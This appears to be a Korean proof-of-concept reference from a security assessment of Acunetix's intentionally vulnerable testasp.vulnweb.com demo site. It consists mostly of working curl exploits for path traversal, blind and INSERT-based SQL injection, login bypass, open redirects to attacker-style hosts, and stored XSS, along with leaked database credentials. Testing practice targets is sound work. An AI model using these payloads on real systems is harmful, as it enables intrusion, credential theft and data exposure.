# PoC 코드 — testasp.vulnweb.com

- 대상: `http://testasp.vulnweb.com` (Acunetix vulnweb ASP 트랙, Microsoft-IIS/8.5, WAF 없음)
- 이 문서는 **가장 깔끔한 최소 재현**만 담는다. 탐색 과정·자동화 코드는 `Exploit-코드.md`,
  실행 순서 서술은 `PoC-시나리오.md`, 영향도 서술은 `Exploit-시나리오.md`.
- 모든 요청은 **읽기 전용**이며 세션/게시글을 만드는 2건(저장형 XSS)만 쓰기를 동반한다.
- `--noproxy '*'` 는 실행 환경의 프록시 간섭을 피하기 위한 로컬 curl 옵션이며 대상과 무관하다.

```bash
BASE=http://testasp.vulnweb.com
CURL="curl -s --noproxy * --max-time 30"
```

---

## 1. 임의 파일 읽기 (Path Traversal / LFI) — `/Templatize.asp?item=`

필터가 전혀 없다. `item` 값이 `Server.MapPath(".")` 뒤에 그대로 이어 붙는다.

```bash
# 1-1. 애플리케이션 소스 + DB 자격증명 (가장 강력한 단일 요청)
curl -s "$BASE/Templatize.asp?item=db.asp" | grep -o "Provider=[^<\"]*"
# → Provider=SQLNCLI11;Server=(local)\SQL;Database=acuforum;Uid=acunetix;Pwd=acunetixtrustno1

# 1-2. 임의 .asp 소스 평문 노출 (필터 없음 증명: 인코딩 없는 상대경로도 통과)
curl -s "$BASE/Templatize.asp?item=Search.asp"     # SQLi 쿼리 원문 포함
curl -s "$BASE/Templatize.asp?item=Login.asp"      # 인증 쿼리 + RetURL 리다이렉트
curl -s "$BASE/Templatize.asp?item=ShowThread.asp" # id 주입 지점 + 파괴적 DELETE 코드
curl -s "$BASE/Templatize.asp?item=ShowForum.asp"
curl -s "$BASE/Templatize.asp?item=shownews.asp"
curl -s "$BASE/Templatize.asp?item=Templatize.asp" # 자기 자신(필터 없음 확정)

# 1-3. 웹루트 밖 — C:\Windows (깊이 2 = C:\ , Round 7 실측)
curl -s "$BASE/Templatize.asp?item=..%2f..%2fwindows%2fwin.ini"
curl -s "$BASE/Templatize.asp?item=..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts"
curl -s "$BASE/Templatize.asp?item=..%2f..%2fwindows%2fPanther%2funattend.xml"

# 1-4. 설정·구성 파일
curl -s "$BASE/Templatize.asp?item=web.config"
curl -s "$BASE/Templatize.asp?item=..%2f..%2fwindows%2fmicrosoft.net%2fframework64%2fv4.0.30319%2fconfig%2fmachine.config"
curl -s "$BASE/Templatize.asp?item=..%2f..%2fwindows%2fmicrosoft.net%2fframework64%2fv4.0.30319%2fconfig%2fweb.config"
curl -s "$BASE/Templatize.asp?item=..%2f..%2fwindows%2fsystem32%2finetsrv%2fconfig%2fschema%2fIIS_schema.xml"
curl -s "$BASE/Templatize.asp?item=..%2f..%2fprogram%20files%2fAmazon%2fEc2ConfigService%2fSettings%2fconfig.xml"

# 1-5. 앱 루트 밖 다른 사이트 콘텐츠까지 읽힘
curl -s "$BASE/Templatize.asp?item=..%2f..%2finetpub%2fwwwroot%2fiisstart.htm" | head -5
```

**파일 존재 오라클**: `200` + 본문 = 존재/읽기 가능, `500`(본문 1208B 고정) = 없음 또는 권한 없음.

---

## 2. 임의 파일 읽기 (두 번째 프리미티브) — `/shownews.asp?item=`

`item` 파라미터명만 동작한다(`id`/`newsid`/`fname`/`file`/`n`/`note` 는 모두 500).
출력은 HTML 인코딩되지만 파일 내용은 그대로 노출된다.

```bash
curl -s "$BASE/shownews.asp?item=db.asp" | head -20
curl -s "$BASE/shownews.asp?item=..%2f..%2f..%2f..%2fwindows%2fwin.ini"
curl -s "$BASE/shownews.asp?item=..%2f..%2f..%2fwindows%2fPanther%2funattend.xml"
```

---

## 3. SQL Injection (boolean-blind) — `/search.asp?tfSearch=`

```bash
# 3-1. TRUE / FALSE 쌍 (행 수가 확연히 다름)
curl -s "$BASE/search.asp?tfSearch=zzq%27)%3E0%20OR%20(1%3D1))--" | grep -c "class='posttext'"   # → 0 초과 = TRUE (2026-09-23 실측 114행; 값은 변동하므로 '0 초과' 만 본다)
curl -s "$BASE/search.asp?tfSearch=zzq%27)%3E0%20OR%20(1%3D2))--" | grep -c "class='posttext'"   # → 0 = FALSE (이쪽이 판정 기준: 0 이냐 아니냐)

# 안전한 인코딩 버전(권장)
curl -s -G --data-urlencode "tfSearch=zzq')>0 OR (1=1))--" "$BASE/search.asp" | grep -c "class='posttext'"
curl -s -G --data-urlencode "tfSearch=zzq')>0 OR (1=2))--" "$BASE/search.asp" | grep -c "class='posttext'"

# 3-2. 서브쿼리 오라클 (임의 SQL 스칼라식의 참/거짓을 읽는다)
curl -s -G --data-urlencode "tfSearch=zzq')>0 OR ((SELECT SYSTEM_USER)='acunetix'))--" "$BASE/search.asp" | grep -c "class='posttext'"  # → FALSE(0) 와 구분되면 TRUE
curl -s -G --data-urlencode "tfSearch=zzq')>0 OR ((SELECT SYSTEM_USER)='sa'))--"       "$BASE/search.asp" | grep -c "class='posttext'"  # → 0  FALSE

# 3-3. 구문 오류(오류기반 확인)
curl -s "$BASE/search.asp?tfSearch=zzq%27" -o /dev/null -w '%{http_code}\n'   # → 500
```

**주의(트랩)**: 원본 쿼리가 `CHARINDEX(a.title, '<입력>')>0` 형태이므로 반드시
`zzq')>0 OR (<조건>))--` 로 **괄호 균형**을 맞춰야 한다. `(1=1)>0` 처럼 쓰면 T-SQL 오류로 500이
나서 "차단됐다"고 오진하게 된다.

---

## 4. SQL Injection (`id` 파라미터) — `/showforum.asp` · `/showthread.asp`

오라클: **TRUE = 200 / FALSE = 500** (조건이 거짓이면 첫 SELECT 가 0행 → `forumid`/`threadid`
변수가 비고, 그 값이 다음 쿼리에 들어가 깨진다).

```bash
# 4-1. showforum.asp?id=
curl -s -G --data-urlencode "id=0 AND 1=1" "$BASE/showforum.asp" -o /dev/null -w '%{http_code}\n'  # → 200
curl -s -G --data-urlencode "id=0 AND 1=2" "$BASE/showforum.asp" -o /dev/null -w '%{http_code}\n'  # → 500

# 4-2. 쓸 id 를 먼저 확보한다 (★ id 는 고정이 아니다 — 데모 DB 리셋·외부 사용으로 변동)
#      포럼 페이지의 링크에서 현존 스레드 id 를 뽑는다 (2026-09-23 실측: 포럼 0/1/2, 스레드 0~7)
TID=$(curl -s "$BASE/showforum.asp?id=0" | grep -o "showthread\.asp?id=[0-9]*" | head -1 | grep -o "[0-9]*$")

# 4-3. id 파라미터 SQLi 오라클 (TRUE=200 / FALSE=500)
curl -s -G --data-urlencode "id=$TID AND 1=1" "$BASE/showthread.asp" -o /dev/null -w '%{http_code}\n'  # → 200
curl -s -G --data-urlencode "id=$TID AND 1=2" "$BASE/showthread.asp" -o /dev/null -w '%{http_code}\n'  # → 500

# 4-4. 값 추출 시연 — 그 스레드의 게시글 수를 블라인드로 뽑는다 (값을 하드코딩하지 말고 이분탐색)
curl -s -G --data-urlencode "id=$TID AND (SELECT COUNT(*) FROM posts WHERE threadid=$TID)>0" "$BASE/showthread.asp" | grep -c "class='posttext'"   # → 1 이상 = TRUE
curl -s -G --data-urlencode "id=$TID AND (SELECT COUNT(*) FROM posts WHERE threadid=$TID)>99" "$BASE/showthread.asp" -o /dev/null -w '%{http_code}\n'  # → 500 ⇒ 실제값은 99 이하

# 4-4. 오류기반 / 주석 / 공백대체
curl -s -G --data-urlencode "id=0'" "$BASE/showforum.asp" -o /dev/null -w '%{http_code}\n'          # 500
curl -s -G --data-urlencode "id=0--" "$BASE/showforum.asp" -o /dev/null -w '%{http_code}\n'         # 200
curl -s -G --data-urlencode "id=0/**/AND/**/1=1" "$BASE/showforum.asp" -o /dev/null -w '%{http_code}\n' # 200
```

---

## 5. 인증 우회 (SQLi) — `POST /Login.asp`

```bash
curl -s -D - -o /dev/null -X POST "$BASE/Login.asp" \
  --data-urlencode 'tfUName=admin' --data-urlencode "tfUPass=x' OR '1'='1" | grep -i '^location'
# → Location: Default.asp

# 세션 확인 (로그인 후 메뉴에 사용자명이 그대로 노출됨)
curl -s -b jar.txt "$BASE/Default.asp" | grep -o 'logout [^<]*'
# → logout admin
```

**주의**: `tfUName` 에 따옴표가 들어간 페이로드(`admin'--`)로 로그인하면 세션 사용자명에
따옴표가 저장되어 **글쓰기(INSERT) 경로가 전부 500** 이 된다. → 주입은 `tfUPass` 쪽으로 옮긴다
(위 형태). 자세한 내용은 `Exploit-시나리오.md` ②-③.

---

## 6. 오픈 리다이렉트 — `/Logout.asp?RetURL=` (권장 PoC) · `/Login.asp?RetURL=`

`RetURL` 취약 패턴은 4개 파일에 복제돼 있으나 **조건이 가장 약한 것은 Logout.asp** 다
(GET 한 방, 인증·본문 불필요). 보고서 대표 PoC 로는 이쪽을 쓴다.

```bash
# 6-1. ★ /Logout.asp — 무인증 · 단일 GET
curl -s -D - -o /dev/null "$BASE/Logout.asp?RetURL=http%3A%2F%2Fexample.com%2F" | grep -i '^location'
# → Location: http://example.com/

# 검증된 우회 변형 (전부 그대로 통과 — 검증·화이트리스트 없음, 2026-09-23 실측)
#   %2F%2Fevil.example%2Fp    → //evil.example/p
#   https%3A%2F%2Fattacker.tld%2Fphish → https://attacker.tld/phish
#   https%3Aexample.com       → https:example.com       (스킴만 지정)
#   %09%2F%2Fevil.example     → %09//evil.example       (탭 접두)
#   %2F%5Cevil.example        → /%5Cevil.example        (백슬래시 혼합)
# 대조군: 파라미터 없음 → Location: Default.asp

# 6-2. /Login.asp — POST 로그인 성공이 선행 조건
curl -s -D - -o /dev/null -X POST \
  --data "tfUName=admin&tfUPass=x' OR '1'='1" \
  "$BASE/Login.asp?RetURL=http%3A%2F%2Fexample.com%2F" | grep -i '^location'
# → Location: http://example.com/
# (참고: GET 만으로는 리다이렉트되지 않음 → 200)
```

| 위치 | 조건 | 리다이렉트 | 판정 |
|---|---|---|---|
| **`/Logout.asp`** | **없음(무인증·GET)** | `Request.QueryString("RetURL")` 그대로 | ★ **대표 PoC** |
| `/Login.asp` | 로그인 POST 성공(자격증명 또는 SQLi 우회) | 동일 | 취약 |
| `/Register.asp` | 회원가입 POST 성공 | `Login.asp?RetURL=<값>` 로 **동일 호스트 전달** → 이후 로그인 필요 | 취약(2단계) |
| `/Templatize.asp` | — | 없음(링크 생성에만 사용, URL 인코딩됨) | 해당 없음 |

---

## 7. 반사형 XSS — `/search.asp?tfSearch=`

```bash
curl -s "$BASE/search.asp?tfSearch=%3Cscript%3Ealert(1)%3C%2Fscript%3E" \
  | grep -o "You searched for[^<]*"
# → You searched for '<script>alert(1)</script>'   (무이스케이프 반사)
```

---

## 8. 저장형 XSS — `POST /showthread.asp?id=<n>` (+ 브라우저 실행 증거)

```bash
# 8-1. 세션 확보 (5번)
curl -s -c jar.txt -b jar.txt -o /dev/null -X POST "$BASE/Login.asp" \
  --data-urlencode 'tfUName=admin' --data-urlencode "tfUPass=x' OR '1'='1"

# 8-2. 게시글 1건 작성 — 쓰기 1회 발생
curl -s -b jar.txt -X POST "$BASE/showthread.asp?id=0" \
  --data-urlencode 'tfSubject=RT6-STORED-XSS-PROOF' \
  --data-urlencode 'tfText=<img src=x onerror=alert(1)>'

# 8-3. 미인증 조회에서도 페이로드가 원문 그대로 렌더됨 (핵심)
curl -s "$BASE/showthread.asp?id=0" | grep -o "class='posttext'><img[^>]*>"
# → class='posttext'><img src=x onerror=alert(1)>
```

브라우저 실행 증거(CDP, `scratch/round6/xss_exec_proof.py` → `out/xss_exec_proof.txt`):
```json
{"dialog_count": 1,
 "dialogs": [{"url": "http://testasp.vulnweb.com/showthread.asp?id=0",
              "message": "1", "type": "alert"}],
 "cookie_via_js": "ASPSESSIONIDAABTRDTB=JKOPEGBBOGJKENDIFHIAMKLJ",
 "cookie_readable": true, "img_present": true, "img_onerror_attr": "alert(1)"}
```
→ 페이로드가 실제로 실행되고(alert 다이얼로그 발생), 같은 페이지에서 `document.cookie` 가
읽힌다(= 세션 쿠키에 `HttpOnly` 없음). 스크린샷 `screenshots/xss_proof.png`.

스레드 **생성 경로도 동일** (`POST /showforum.asp?id=<n>`, 파라미터 `tfSubject`/`tfText`).

---

## 9. 교차 애플리케이션 데이터 노출 (search.asp 오라클 경유)

같은 SQL Server 인스턴스의 다른 앱 DB 에 읽기 권한이 열려 있다.

```bash
# 9-1. 접근 가능 DB 목록
for i in 1 2 3 4 5 6 7; do
  curl -s -G --data-urlencode "tfSearch=zzq')>0 OR (DB_NAME($i) IS NOT NULL))--" "$BASE/search.asp" >/dev/null
done
# 실제 확인값: master, tempdb, model, msdb, acublog, acuforum, acuservice
# HAS_DBACCESS: master T / tempdb T / model F / msdb T / acublog T / acuforum T / acuservice T

# 9-2. 다른 앱 테이블 실존 확인
curl -s -G --data-urlencode "tfSearch=zzq')>0 OR ((SELECT COUNT(*) FROM acuservice.dbo.users)>0))--" "$BASE/search.asp" | grep -c "class='posttext'"   # → 0 초과 = TRUE

# 9-3. 컬럼 수 (스키마 추론)
curl -s -G --data-urlencode "tfSearch=zzq')>0 OR ((SELECT COUNT(*) FROM acuservice.sys.columns WHERE object_id=(SELECT object_id FROM acuservice.sys.tables WHERE name='users'))>=8))--" "$BASE/search.asp" | grep -c "class='posttext'"  # → 0 초과 = TRUE
```

확인된 스키마(값 추출은 `Exploit-코드.md` 의 추출기 사용):
```
acuservice.dbo.users : id, username, password, name, joindate, ccnumber, ccverification, address   (2행, 'blade'/'tibi')
acublog.dbo.users    : uname, upass, alevel                                                        (1행, 'admin')
acuforum.users       : uname, upass, email, realname, avatar                                        (수백 행, 평문 4자 비밀번호)
```

---

## 10. 서버 경로 노출 (msdb 백업 이력)

```bash
curl -s -G --data-urlencode "tfSearch=zzq')>0 OR ((SELECT COUNT(*) FROM msdb.dbo.backupset)>0))--" "$BASE/search.asp" | grep -c "class='posttext'"   # → 0 초과 = TRUE (백업 6건)
curl -s -G --data-urlencode "tfSearch=zzq')>0 OR (CAST(SERVERPROPERTY('InstanceDefaultDataPath') AS varchar(200)) IS NOT NULL))--" "$BASE/search.asp" | grep -c "class='posttext'"
```
확인값:
```
backupset 6행 / backupmediafamily 6행 / backupfile 12행
physical_device_name = C:\Backup_testasp_testaspnet_1apr2021\Databases\Backup_from_Management_Studio\acublog_1apr2021
InstanceDefaultDataPath = InstanceDefaultLogPath = C:\Program Files\Microsoft SQL Server\MSSQL12.SQL\MSSQL\DATA\
```

---

## 11. INSERT 기반 SQL Injection (쓰기) — `POST /Register.asp`

회원가입 폼의 4개 필드가 **이스케이프 없이** INSERT 문에 결합된다. 단일 문 안에서 VALUES 목록을
조작해 서브쿼리 결과를 **데이터로 기록**할 수 있다(= 쓰기 원시능력).

```bash
# 11-1. 기준선 — 정상 회원가입 (기능 자체 확인)
curl -s -X POST "$BASE/Register.asp" \
  --data-urlencode 'tfUName=RT12TEST' --data-urlencode 'tfUPass=RT12pass' \
  --data-urlencode 'tfEmail=rt12@example.invalid' --data-urlencode 'tfRName=RT12 Test'
# → 200 (redirect: Login.asp?RetURL=)

# 11-2. 주입 — VALUES 5개를 맞추고 나머지를 -- 로 주석 처리
curl -s -X POST "$BASE/Register.asp" \
  --data-urlencode "tfUName=rt12x', 'p', 'e', 'r', (SELECT TOP 1 upass FROM users WHERE uname='admin'))--" \
  --data-urlencode 'tfUPass=x' --data-urlencode 'tfEmail=x' --data-urlencode 'tfRName=x'

# 실행되는 SQL:
#   INSERT INTO users (uname, upass, email, realname, avatar) VALUES
#     ('rt12x','p','e','r',(SELECT TOP 1 upass FROM users WHERE uname='admin'))-- ', 'x', 'x', 'x', '')
```

**검증 (읽기 전용 오라클로만 판정 — 응답 코드가 아니라 행의 내용을 본다)**
```bash
O() { curl -s -G --data-urlencode "tfSearch=zzq')>0 OR ($1))--" "$BASE/search.asp" \
        | grep -c "class='posttext'"; }   # 0 초과면 TRUE, 0이면 FALSE (절대 행수를 하드코딩하지 말 것)

O "(SELECT COUNT(*) FROM users WHERE uname='rt12x')>0"
# → TRUE   (주입 행이 실제로 삽입됨)
O "(SELECT avatar FROM users WHERE uname='rt12x')=(SELECT TOP 1 upass FROM users WHERE uname='admin')"
# → TRUE   ★ INSERT 값 목록 안에서 서브쿼리가 실행됨 = 쓰기 원시능력 확정
O "(SELECT email FROM users WHERE uname='rt12x')='e'"     # → TRUE (주입 리터럴 반영)
O "(SELECT realname FROM users WHERE uname='rt12x')='r'"  # → TRUE
O "(SELECT COUNT(*) FROM users WHERE uname='rt12x')=1"    # → TRUE (정확히 1행)
```

**대조군 (이게 없으면 증거가 성립하지 않는다)**
```bash
curl -s -X POST "$BASE/Register.asp" --data-urlencode 'tfUName=rt12ctrl' \
  --data-urlencode 'tfUPass=p' --data-urlencode 'tfEmail=e2' --data-urlencode 'tfRName=r2'
O "(SELECT avatar FROM users WHERE uname='rt12ctrl')=''"
# → TRUE  ⇒ 정상 등록은 avatar 가 빈 값. 주입 행만 값이 들어 있음
```

**쓰기→읽기 체인**: `(SELECT avatar FROM users WHERE uname='rt12x')` 를 추출 함수로 읽으면
관리자 `upass`(`none`, 4자)가 그대로 회수된다. 교차확인: `LEN(upass)=4` TRUE, `upass=LOWER(upass)` TRUE.

**영향 상한**: 스택드 쿼리 미실행이므로 **단일 INSERT 문 내부 조작만** 가능 →
`users` 테이블에 **행 1건 삽입**이 한계. UPDATE/DELETE 불가 ⇒ 삭제·변조까지는 아니다.

> ⚠ **이 대상의 데모 DB는 주기적으로 리셋된다**(Round 13 확인). 우리가 만든 행·게시글은
> 서버에 영구히 남지 않으므로, 재현 시 매번 다시 만들어야 한다. 증거는 실행 시점의 응답 캡처가
> 유일한 정본이다.

---

## 부록 — 권한 상한 (영향도 산정용, 같은 오라클로 확인)

```bash
curl -s -G --data-urlencode "tfSearch=zzq')>0 OR (IS_SRVROLEMEMBER('sysadmin')=1))--" "$BASE/search.asp" | grep -c "class='posttext'"           # → 0  FALSE
curl -s -G --data-urlencode "tfSearch=zzq')>0 OR ((SELECT CAST(value_in_use AS int) FROM sys.configurations WHERE name='xp_cmdshell')=1))--" "$BASE/search.asp" | grep -c "class='posttext'"  # → 0  FALSE
```
```
IS_SRVROLEMEMBER('sysadmin'/'serveradmin'/'securityadmin') = FALSE, IS_MEMBER('db_owner') = FALSE
HAS_PERMS_BY_NAME(...,'CONTROL SERVER' | 'ALTER SETTINGS') = FALSE, xp_cmdshell EXECUTE = FALSE
sys.configurations value_in_use: xp_cmdshell 0 / show advanced options 0 / Ole Automation 0 / clr enabled 0
스택드 쿼리(`;WAITFOR`)도 미실행 → OS 명령 실행 경로 없음
```


---

## 부록 2 — 재현성 검증 이력 (Round 14, 2026-09-23)

보고서의 모든 헤드라인 PoC 를 **같은 시점에 다시 실행해** 재현을 확인했다(읽기 전용 51요청).

| PoC | 재현 결과 |
|---|---|
| LFI `db.asp` | 200 / 2,908B · DB 자격증명 포함 — 재현 |
| LFI `win.ini` / `web.config` / `unattend.xml` | 200 / 2,739B · 3,138B · 7,052B — 재현(크기 동일) |
| `search.asp` boolean-blind | `(1=1)` → 다수 행 / `(1=2)` → **0행** — 재현 |
| `search.asp` 서브쿼리 오라클 | `SYSTEM_USER='acunetix'` TRUE — 재현 |
| `showforum.asp?id=N` SQLi | id 0·1·2 → `AND 1=1` 200 / `AND 1=2` 500 — 재현 |
| `showthread.asp?id=N` SQLi | id 0·1·2·3 → `AND 1=1` 200 / `AND 1=2` 500 — 재현 |
| `/Logout.asp?RetURL=` | 302 → 외부 URL(변형 6종 전부 통과) — 재현 |
| `/Login.asp?RetURL=` POST | 302 → 외부 URL — 재현 |
| `/_vti_cnf/Default.asp` | 200 / 926B · `vti_extenderversion:4.0.2.8912` — 재현 |
| `Register.asp` INSERT SQLi | 소스 결합 구조 유지 확인(Round 13 실증. 재현하려면 승인 후 행 삽입 필요) |
| 저장형 XSS | ★ **서버측 페이로드 소실**(DB 리셋) → 게시글을 다시 만들어야 재현됨. CDP 증거는 `screenshots/xss_proof.png` |

**변동하는 값(하드코딩 금지)**: `search.asp` TRUE 응답의 행수(실측 114 — 초기 라운드에서는 21이었다),
포럼/스레드 id, `users`·`posts` 행수. 판정은 항상 "**FALSE = 0행과 구분되는가**"로 한다.
